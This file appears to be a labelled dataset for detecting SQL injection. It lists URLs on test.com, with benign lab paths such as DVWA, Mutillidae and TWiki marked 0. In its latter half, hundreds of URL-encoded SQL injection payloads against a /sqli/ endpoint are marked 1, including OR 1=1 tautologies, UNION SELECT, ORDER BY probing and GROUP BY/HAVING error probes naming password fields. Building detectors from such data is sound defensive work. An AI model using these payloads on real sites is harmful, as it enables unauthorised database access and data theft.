test.com/dvwa/about.php/10,0
test.com/dvwa/about.php/9,0
test.com/dvwa/about.php/8,0
test.com/dvwa/about.php/7,0
test.com/dvwa/about.php/6,0
test.com/dvwa/about.php/5,0
test.com/dvwa/about.php/4,0
test.com/dvwa/about.php/3,0
test.com/dvwa/about.php/2,0
test.com/dvwa/about.php/1,0
test.com/dav/?Y=N;O=U,0
test.com/dav/?X=N;O=U,0
test.com/dav/?W=N;O=U,0
test.com/dav/?V=N;O=U,0
test.com/dav/?U=N;O=U,0
test.com/dav/?T=N;O=U,0
test.com/dav/?R=N;O=U,0
test.com/dav/?Q=N;O=U,0
test.com/dav/?P=N;O=U,0
test.com/dav/?O=N;O=U,0
test.com/dav/?N=N;O=U,0
test.com/dav/?M=N;O=U,0
test.com/dav/?L=N;O=U,0
test.com/dav/?K=N;O=U,0
test.com/dav/?I=N;O=U,0
test.com/dav/?J=N;O=U,0
test.com/dav/?H=N;O=U,0
test.com/dav/?G=N;O=U,0
test.com/dav/?F=N;O=U,0
test.com/dav/?E=N;O=U,0
test.com/dav/?D=N;O=U,0
test.com/dav/?B=N;O=U,0
test.com/dav/?A=N;O=U,0
test.com/dav/?C=N;O=U,0
test.com/dav/?C=N;O=T,0
test.com/dav/?C=N;O=S,0
test.com/dav/?C=N;T=T,0
test.com/dav/?C=N;O=R,0
test.com/dav/?C=N;O=Q,0
test.com/dav/?C=N;O=P,0
test.com/dav/?C=N;O=O,0
test.com/dav/?C=N;O=N,0
test.com/dav/?C=N;O=M,0
test.com/dav/?C=N;O=M,0
test.com/dav/?C=N;O=L,0
test.com/dav/?C=N;O=K,0
test.com/dav/?C=N;O=J,0
test.com/dav/?C=N;O=I,0
test.com/dav/?C=N;O=H,0
test.com/dav/?C=N;O=G,0
test.com/dav/?C=N;O=F,0
test.com/dav/?C=N;O=E,0
test.com/dav/?C=N;O=C,0
test.com/dav/?C=N;O=D,0
test.com/dav/?C=N;O=B,0
test.com/dav/?C=N;O=A,0
test.com/mutillidae/index.php?page=home.php,0
test.com/mutillidae/index.php?page=login.php,0
test.com/mutillidae/set-up-database.php,0
test.com/mutillidae/index.php?page=change-log.htm,0
test.com/mutillidae/index.php?page=installation.php,0
test.com/mutillidae/index.php?page=documentation/vulnerabilities.php,0
test.com/mutillidae/index.php?page=user-info.php,0
test.com/dvwa/login.php,0
test.com/dvwa/security.php,0
test.com/dvwa/about.php,0
test.com/dvwa/setup.php,0
test.com/dvwa/vulnerabilities/brute/,0
test.com/dvwa/vulnerabilities/exec/,0
test.com/dvwa/vulnerabilities/csrf/,0
test.com/dvwa/vulnerabilities/fi/?page=include.php,0
test.com/phpMyAdmin/,0
test.com/twiki/TWikiDocumentation.html,0
test.com/twiki/TWikiDocumentation.html#The_Go_Box_and_Navigation_Box,0
test.com/twiki/TWikiDocumentation.html#TWiki_System_Requirements,0
test.com/twiki/TWikiDocumentation.html#Server_Requirements,0
test.com/twiki/TWikiDocumentation.html#Client_Requirements,0
test.com/twiki/TWikiDocumentation.html#Known_Issues,0
test.com/twiki/TWikiDocumentation.html#TWiki_Installation_Guide,0
test.com/twiki/TWikiDocumentation.html#Standard_Installation,0
test.com/twiki/TWikiDocumentation.html#Step_1_Create_Configure_the_Dire,0
test.com/twiki/TWikiDocumentation.html#Step_1_for_Non_Root_Accounts,0
test.com/twiki/TWikiDocumentation.html#Step_2_Set_File_Permissions,0
test.com/twiki/TWikiDocumentation.html#Step_3_Set_the_Main_Configuratio,0
test.com/twiki/TWikiDocumentation.html#Step_4_Configure_Site_Wide_Email,0
test.com/twiki/TWikiDocumentation.html#Step_5_Finish_Up_from_Your_Brows,0
test.com/twiki/TWikiDocumentation.html#Additional_Server_Level_Options,0
test.com/twiki/TWikiDocumentation.html#Enabling_Authentication_of_Users,0
test.com/twiki/TWikiDocumentation.html#Restricting_Read_Access,0
test.com/twiki/TWikiDocumentation.html#Deny_Viewing_by_Topic,0
test.com/twiki/TWikiDocumentation.html#Deny_Viewing_by_Web,0
test.com/twiki/TWikiDocumentation.html#Obfuscate_Webs,0
test.com/twiki/TWikiDocumentation.html#TWiki_File_System_Info,0
test.com/twiki/TWikiDocumentation.html#Alternatives,0
test.com/twiki/TWikiDocumentation.html#Deny_Renaming_by_Web,0
test.com/twiki/TWikiDocumentation.html#Checking_versions,0
test.com/twiki/TWikiDocumentation.html#Credits,0
test.com/twiki/TWikiDocumentation.html#TWiki_Upgrade_Guide,0
test.com/twiki/TWikiDocumentation.html#Overview,0
test.com/twiki/TWikiDocumentation.html#Upgrade_Requirements,0
test.com/twiki/TWikiDocumentation.html#Major_Changes_from_TWiki_01_Dec_,0
test.com/twiki/TWikiDocumentation.html#Upgrade_Procedure_from_01_Dec_20,0
test.com/twiki/TWikiDocumentation.html#Apache,0
test.com/twiki/TWikiDocumentation.html#Cygwin_Unix_tools_Perl_and_RCS,0
test.com/twiki/TWikiDocumentation.html#TWiki_part_2_,0
test.com/twiki/TWikiDocumentation.html#Configuring_components,0
test.com/twiki/TWikiDocumentation.html#Configuring_Apache,0
test.com/twiki/TWikiDocumentation.html#Editing_the_CGI_scripts,0
test.com/twiki/TWikiDocumentation.html#Perl_module_installation,0
test.com/twiki/TWikiDocumentation.html#Re_locking_RCS_files,0
test.com/twiki/TWikiDocumentation.html,0
test.com/twiki/TWikiDocumentation.html#TWiki_User_Authentication,0
test.com/twiki/TWikiDocumentation.html#Users_and_Groups,0
test.com/twiki/TWikiDocumentation.html#An_Important_Control_Considerati,0
test.com/twiki/TWikiDocumentation.html#Deny_Editing_by_Topic,0
test.com/twiki/TWikiDocumentation.html#Authentication_Options,0
test.com/twiki/TWikiDocumentation.html#Deny_Editing_by_Web,0
test.com/twiki/TWikiDocumentation.html#Deny_Renaming_by_Topic,0
test.com/twiki/TWikiDocumentation.html#Restricting_Rename_Access,0
test.com/twiki/TWikiDocumentation.html#Managing_Users,0
test.com/twiki/TWikiDocumentation.html#Managing_Groups,0
test.com/twiki/TWikiDocumentation.html#Restricting_Write_Access,0
test.com/twiki/TWikiDocumentation.html#Authenticate_all_Webs_and_Restri,0
test.com/twiki/TWikiDocumentation.html#Authenticate_and_Restricting_Sel,0
test.com/twiki/TWikiDocumentation.html#Hiding_Control_Settings,0
test.com/twiki/TWikiDocumentation.html#The_SuperAdminGroup,0
test.com/twiki/TWikiDocumentation.html#TWiki_Text_Formatting,0
test.com/twiki/TWikiDocumentation.html#TWiki_Editing_Shorthand,0
test.com/twiki/TWikiDocumentation.html#Using_HTML,0
test.com/twiki/TWikiDocumentation.html#TWiki_HTML_Rendering,0
test.com/twiki/TWikiDocumentation.html#Hyperlinks,0
test.com/twiki/TWikiDocumentation.html#Internal_Links,0
test.com/twiki/TWikiDocumentation.html#TWikiPlugin_Formatting_Extension,0
test.com/twiki/TWikiDocumentation.html#TWiki_Variables,0
test.com/twiki/TWikiDocumentation.html#Common_Editing_Errors,0
test.com/twiki/TWikiDocumentation.html#Predefined_Variables,0
test.com/twiki/TWikiDocumentation.html#Preferences_Variables,0
test.com/twiki/TWikiDocumentation.html#Setting_Preferences,0
test.com/twiki/TWikiDocumentation.html#Creating_Custom_Variables,0
test.com/twiki/TWikiDocumentation.html#File_Attachments,0
test.com/twiki/TWikiDocumentation.html#What_Are_Attachments_Good_For_,0
test.com/twiki/TWikiDocumentation.html#Document_Management_System,0
test.com/twiki/TWikiDocumentation.html#File_Sharing,0
test.com/twiki/TWikiDocumentation.html#Web_Authoring,0
test.com/twiki/TWikiDocumentation.html#Uploading_Files,0
test.com/twiki/TWikiDocumentation.html#Downloading_Files,0
test.com/twiki/TWikiDocumentation.html#Moving_Attachment_Files,0
test.com/twiki/TWikiDocumentation.html#Deleting_Attachments,0
test.com/twiki/TWikiDocumentation.html#Linking_to_Attached_Files,0
test.com/twiki/TWikiDocumentation.html#File_Attachment_Contents_Table,0
test.com/twiki/TWikiDocumentation.html#File_Attachment_Controls,0
test.com/twiki/TWikiDocumentation.html#TWiki_Forms,0
test.com/twiki/TWikiDocumentation.html#Main_Changes_from_Category_Table,0
test.com/twiki/TWikiDocumentation.html#Importing_Category_Table_Data,0
test.com/twiki/TWikiDocumentation.html#Defining_a_Form_Template,0
test.com/twiki/TWikiDocumentation.html#Form_Template_Elements,0
test.com/twiki/TWikiDocumentation.html#Defining_a_Form_in_One_Topic,0
test.com/twiki/TWikiDocumentation.html#Defining_a_Form_with_Multiple_To,0
test.com/twiki/TWikiDocumentation.html#Enabling_Forms_by_Web,0
test.com/twiki/TWikiDocumentation.html#Including_Forms_in_New_Topics,0
test.com/twiki/TWikiDocumentation.html#Setting_Up_Multiple_Form_Options,0
test.com/twiki/TWikiDocumentation.html#Form_Data_Storage,0
test.com/twiki/TWikiDocumentation.html#Using_Form_Data,0
test.com/twiki/TWikiDocumentation.html#TWiki_Templates,0
test.com/twiki/TWikiDocumentation.html#Major_changes_from_the_previous_,0
test.com/twiki/TWikiDocumentation.html#How_Template_Variables_Work,0
test.com/twiki/TWikiDocumentation.html#Types_of_Template,0
test.com/twiki/TWikiDocumentation.html#Master_Templates,0
test.com/twiki/TWikiDocumentation.html#HTML_Page_Templates,0
test.com/twiki/TWikiDocumentation.html#Template_Topics,0
test.com/twiki/TWikiDocumentation.html#Edit_Template_Topics_and_Variabl,0
test.com/twiki/TWikiDocumentation.html#Template_Topics_in_Action,0
test.com/twiki/TWikiDocumentation.html#Templates_by_Example,0
test.com/twiki/TWikiDocumentation.html#Base_template_oopsbase_tmpl,0
test.com/twiki/TWikiDocumentation.html#Test_template_oopstest_tmpl,0
test.com/twiki/TWikiDocumentation.html#Sample_screen_shot_of_oopstest_t,0
test.com/twiki/TWikiDocumentation.html#TWiki_Skins,0
test.com/twiki/TWikiDocumentation.html#Defining_Skins,0
test.com/twiki/TWikiDocumentation.html#Variables_in_Skins,0
test.com/twiki/TWikiDocumentation.html#Packaging_and_Publishing_Skins,0
test.com/twiki/TWikiDocumentation.html#Activating_Skins,0
test.com/twiki/TWikiDocumentation.html#TWiki_Formatted_Search_Results,0
test.com/twiki/TWikiDocumentation.html#Syntax,0
test.com/twiki/TWikiDocumentation.html#Bullet_list_showing_topic_name_a,0
test.com/twiki/TWikiDocumentation.html#Table_showing_form_field_values_,0
test.com/twiki/TWikiDocumentation.html#Extract_some_text_from_a_topic_u,0
test.com/twiki/TWikiDocumentation.html#Nested_Search,0
test.com/twiki/TWikiDocumentation.html#TWiki_Meta_Data,0
test.com/twiki/TWikiDocumentation.html#Meta_Data_Syntax,0
test.com/twiki/TWikiDocumentation.html#Meta_Data_Specifications,0
test.com/twiki/TWikiDocumentation.html#META_TOPICINFO,0
test.com/twiki/TWikiDocumentation.html#META_TOPICMOVED,0
test.com/twiki/TWikiDocumentation.html#META_TOPICPARENT,0
test.com/twiki/TWikiDocumentation.html#META_FILEATTACHMENT,0
test.com/twiki/TWikiDocumentation.html#META_FORM,0
test.com/twiki/TWikiDocumentation.html#META_FIELD,0
test.com/twiki/TWikiDocumentation.html#Recommended_Sequence,0
test.com/twiki/TWikiDocumentation.html#Viewing_Meta_Data_in_Page_Source,0
test.com/twiki/TWikiDocumentation.html#Rendering_Meta_Data,0
test.com/twiki/TWikiDocumentation.html#TWiki_Plugins,0
test.com/twiki/TWikiDocumentation.html#Preinstalled_Plugins,0
test.com/twiki/TWikiDocumentation.html#Installing_Plugins,0
test.com/twiki/TWikiDocumentation.html#On_Site_Pretesting,0
test.com/twiki/TWikiDocumentation.html#The_TWiki_Plugin_API,0
test.com/twiki/TWikiDocumentation.html#Available_Core_Functions,0
test.com/twiki/TWikiDocumentation.html#Predefined_Hooks,0
test.com/twiki/TWikiDocumentation.html#Plugin_Version_Detection,0
test.com/twiki/TWikiDocumentation.html#Creating_Plugins,0
test.com/twiki/TWikiDocumentation.html#The_DefaultPlugin_Alternative,0
test.com/twiki/TWikiDocumentation.html#Anatomy_of_a_Plugin,0
test.com/twiki/TWikiDocumentation.html#Creating_the_Perl_Module,0
test.com/twiki/TWikiDocumentation.html#Writing_the_Documentation_Topic,0
test.com/twiki/TWikiDocumentation.html#Packaging_for_Distribution,0
test.com/twiki/TWikiDocumentation.html#Publishing_for_Public_Use,0
test.com/sqli/?id=%27+or+%22&Submit=Submit#,1
test.com/sqli/?id=%27+or+1=1+%22&Submit=Submit#,1
test.com/sqli/?id=%27+and+%22&Submit=Submit#,1
test.com/sqli/?id=%27+or+=+%271+%22&Submit=Submit#,1
test.com/sqli/?id=%27+or+1=1%27+%22&Submit=Submit#,1
test.com/sqli/?id=%27+and+1=1+%22&Submit=Submit#,1
test.com/sqli/?id=%27+or+and+=+%271+%22&Submit=Submit#,1
test.com/sqli/?id=%27+and+or+=+%271+%22&Submit=Submit#,1
test.com/sqli/?id=%27+or+1=1+--+%22&Submit=Submit#,1
test.com/sqli/?id=%27+and+1=1+--+%22&Submit=Submit#,1
test.com/sqli/?id=%27+AND+id+IS+NULL%3B+--&Submit=Submit#,1
test.com/sqli/?id=%27+AND+1+IS+NULL%3B+--&Submit=Submit#,1
test.com/sqli/?id=%27+AND+50+IS+NULL%3B+--&Submit=Submit#,1
test.com/sqli/?id=%27+AND+07+IS+NULL%3B+--&Submit=Submit#,1
test.com/sqli/?id=%27+AND+67+IS+NULL%3B+--&Submit=Submit#,1
test.com/sqli/?id=%27+AND+id+80+NULL%3B+--&Submit=Submit#,1
test.com/sqli/?id=%27+AND+id+1000+NULL%3B+--&Submit=Submit#,1
test.com/sqli/?id=%27+AND+id+IS+%3B+--&Submit=Submit#,1
test.com/sqli/?id=%27+AND+9+IS+%3B+--&Submit=Submit#,1
test.com/sqli/?id=%27+AND+id+100+NULL%3B+--&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27UNION+SELECT+%272&Submit=Submit#,1
test.com/sqli/?id%27%27%27%27%27%27%27%27%27%27%27%27UNION+SELECT+%272&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27UNION+SELECT+%272&Submit=Submit#,1
test.com/sqli/?id%27%27%27%27%27%27%27%27%27%27%27%27UNION+SELECT+%272&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27UNION+SELECT+%272&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27UNION+SELECT+%2756&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27UNION+SELECT+%27800&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27UNION+SELECT+%2710&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27UNION+SELECT+%272&Submit=Submit#,1
test.com/sqli/?id=%27%27UNION+SELECT+%2745&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27UNION+ ALL+SELECT+%27287&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27UNION+ ALL+SELECT+%2734&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27UNION+ ALL+SELECT+%27287&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27UNION+ ALL+SELECT+1+%27287&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27UNION+ ALL+SELECT+1+%272900&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27UNION+ ALL+SELECT+1+%27&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27UNION+ ALL+SELECT+1+%27290&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27UNION+ ALL+SELECT+--+%272900&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27UNION+SELECT+--+%27&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27UNION+ ALL+SELECT+1+%272200&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27UNION+SELECT+%27100&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27SELECT+1+%272200&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27SELECT+%272200&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27SELECT+1+%2720&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27SELECT+1+%272200&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27SELECT+1+%27100&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27SELECT+%272200&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27SELECT+%27500&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27SELECT+%272200&Submit=Submit#,1
test.com/sqli/?id=%27%27SELECT+%272200&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+1--%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+%27or+1=1---%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+%27AND+1=1--%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+%27or+1=1%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+%27and+1=1---%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+%27or+1---%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+%27or+%271---%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+%27or+%27%271---%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+or+%27%27%27%27%271=1---%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+or+%27%27%27%27%27%27%27%271%2B&Submit=Submit#,1
test.com/sqli/?id=117%27+ORDER+BY+1--%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+AND+1=1%27%27---%2B&Submit=Submit#,1
test.com/sqli/?id=1%27%27+ORDER+BY+or+%27%27%271=1---%2B&Submit=Submit#,1
test.com/sqli/?id=1%27%27%27+ORDER+BY+or+1=%27%271---%2B&Submit=Submit#,1
test.com/sqli/?id=1%27%27%27%27%27+ORDER+BY+%27or+1=1---%2B&Submit=Submit#,1
test.com/sqli/?id=1%27%27%27%27%27+ORDER+BY+%27%27or+1=1-%2B&Submit=Submit#,1
test.com/sqli/?id=1%27%27%27%27%27%27%27+ORDER+BY+or+%27%271=%27%271---%2B&Submit=Submit#,1
test.com/sqli/?id=1%27%27%27%27%27+ORDER+BY+%27or+%271=%271---%2B&Submit=Submit#,1
test.com/sqli/?id=1%27%27%27%27%27+ORDER+BY+or+1=%27%271---%2B&Submit=Submit#,1
test.com/sqli/?id=1%27%27%27%27%27+ORDER+BY+%27%27or+1=1---%2B&Submit=Submit#,1
test.com/sqli/?id=3%27+ORDER+BY+112--%2B&Submit=Submit#,1
test.com/sqli/?id=%27%27+ORDER+BY+112--%2B&Submit=Submit#,1
test.com/sqli/?id=%27%27+ORDER+BY+10--%2B&Submit=Submit#,1
test.com/sqli/?id=%27%27+ORDER+BY+1=1%2B&Submit=Submit#,1
test.com/sqli/?id=%27%27+ORDER+BY+%271=1--%2B&Submit=Submit#,1
test.com/sqli/?id=%27%27+ORDER+BY+112---%2B&Submit=Submit#,1
test.com/sqli/?id=%27%27+ORDER+BY+1+=+1--%2B&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27+ORDER+BY+--%2B&Submit=Submit#,1
test.com/sqli/?id=%27%27+ORDER+BY+1+-%2B&Submit=Submit#,1
test.com/sqli/?id=1+ORDER+BY+1--%2B&Submit=Submit#,1
test.com/sqli/?id=3899%27+ORDER+BY+11--%2B&Submit=Submit#,1
test.com/sqli/?id=39%27+ORDER+BY+11--%2B&Submit=Submit#,1
test.com/sqli/?id=99%27+ORDER+BY+11--%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+11--%2B&Submit=Submit#,1
test.com/sqli/?id=100%27+ORDER+BY+11--%2B&Submit=Submit#,1
test.com/sqli/?id=1000%27+ORDER+BY+11--%2B&Submit=Submit#,1
test.com/sqli/?id=10000%27+ORDER+BY+11--%2B&Submit=Submit#,1
test.com/sqli/?id=200%27+ORDER+BY+11--%2B&Submit=Submit#,1
test.com/sqli/?id=29%27+ORDER+BY+11--%2B&Submit=Submit#,1
test.com/sqli/?id=9%27+ORDER+BY+11--%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+1%2C2%2C2%2C5%2C3%2C2%2C4--%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+1%2C2%2C2%2C5%2C3%2C2%2C4--%2B&Submit=Submit#,1
test.com/sqli/?id=1%27%27%27+ORDER+BY+1%2C2%2C2%2C5%2C3%2C2%2C4--%2B&Submit=Submit#,1
test.com/sqli/?id=1+ORDER+BY+1%2C2%2C2%2C5%2C3%2C2%2C4--%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+1%2C3%2C2%2C5--%2B&Submit=Submit#,1
test.com/sqli/?id=1%27%27%27%27+ORDER+BY+1%2C3%2C2%2C5--%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+1%2C3%2C2--%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+1%2C3%2C2%2B&Submit=Submit#,1
test.com/sqli/?id=1%27%27+ORDER+BY+1%2C3%2C2--%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+1%2C3%2C2%2C3%2C2--%2B&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+email+having+1%3D1+--&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+fname+having+1%3D1&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+lname+having+1%3D1+----&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+mname+having+1%3D1%27%27+--&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+password+having+%271%3D%271+--&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+password+having+1%3D1&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+id+having+%271%3D1+--&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+id+having+%27%271%3D%27%271+--&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+id+having+1%3D1+--&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+id+having+1%3D1&Submit=Submit#,1
test.com/sqli/?id=%27%27+GROUP+BY+id+having+1%3D1+--&Submit=Submit#,1
test.com/sqli/?id=%27%27%27+GROUP+BY+id+having+1%3D1+--&Submit=Submit#,1
"test.com/sqli/?id=%27%27%27%27+GROUP+BY+email+,+password+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27+GROUP+BY+email+,+password+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27%27+GROUP+BY+email+,+password+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27%27+GROUP+BY+email+,+password+having+%271%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27%27%27%27+GROUP+BY+email+,+password+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27%27%27%27+GROUP+BY+email+,+password+having+1%3D%271+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27%27%27%27%27+GROUP+BY+email+,+password+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27+GROUP+BY+email+,+password+having+1%3D1+--&Submit=Submit#",1
test.com/sqli/?id=%27+GROUP+BY+dvwa.fname+having+1%3D1+--&Submit=Submit#,1
test.com/sqli/?id=%27%27+GROUP+BY+dvwa.fname+having+1%3D1+--&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+dvwa.fname+having+1%3D1%27+--&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+dvwa.fname+having+1%3D1+--&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+dvwa.fname+having+%27%271%3D1+--&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+dvwa.fname+having+1%3D1&Submit=Submit#,1
test.com/sqli/?id=%27%27+GROUP+BY+dvwa.fname+having+1%3D1&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+dvwa.fname+having+%27%271%3D%27%271+--&Submit=Submit#,1
test.com/sqli/?id=%27%27+GROUP+BY+dvwa.fname+having+1%3D%271+-&Submit=Submit#,1
test.com/sqli/?id=GROUP+BY+dvwa.fname+having+1%3D1&Submit=Submit#,1
"test.com/sqli/?id=%27+GROUP+BY+id+,+fname+having+1%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+id+,+fname+having+1%27%3D1+&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+id+,+fname+having+1%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+id+,+fname+having+1%27%3D%271+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+id+,+fname+having+1%27%3D1%27%27%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27+GROUP+BY+id+,+fname+having+1%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27+GROUP+BY+id+,+fname+having+%27%27%271%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27+GROUP+BY+id+,+fname+having+%27%27%271%27%3D1&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27+GROUP+BY+id+,+fname+having+%27%27%271%27%3D1%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+id+,+fname+having+%27%27%271%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+mname+having+1%27%3D1&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+email+,+mname+having+1%27%3D1&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+email+,+mname+having+1%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+email+,+mname+having+%271%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+email+,+mname+having+1%27%3D%271%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+email+,+mname+having+%271%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+mname+having+%271%27%3D1&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+mname+having+%271%27%3D1&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+email+,+mname+having+1%27%3D1%27%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+table.email+,+table.mname+having+1%27%3D1+--&Submit=Submit#",1
test.com/sqli/?id=%27+GROUP+BY+columnnames+1%27%3D1+--&Submit=Submit#,1
"test.com/sqli/?id=%27+GROUP+BY+fname+,+lname+1%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+fname+,+lname+1%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+fname+,+lname+%271%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+fname+,+lname+%271%27%3D1&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+fname+,+lname+%271%27%3D1%27&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+fname+,+lname+%27%271%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+fname+,+lname+%27%271%27%3D1%27%27&Submit=Submit#",1
"test.com/sqli/?id=+GROUP+BY+fname+,+lname+%27%271%27%3D1%27&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27+GROUP+BY+fname+,+lname+%27%271%27%3D1%27%27&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+fname+,+lname+having+1%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+fname+,+lname+having+1%27%3D1&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+fname+,+lname+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+fname+,+lname+having+1%3D%271+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+email+,+fname+,+lname+having+%271%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+email+,+fname+,+lname+having+%27%271%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+email+,+fname+,+lname+having+1%27%3D1%27&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+fname+,+lname+having+%271%27%27%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+email+,+fname+,+lname+having+1%27%27%3D1%27%27&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27+GROUP+BY+email+,+fname+,+lname+having+1%27%27%3D1%27%27&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+fname+,+email+having+1%27%3D1+--&Submit=Submit#",1
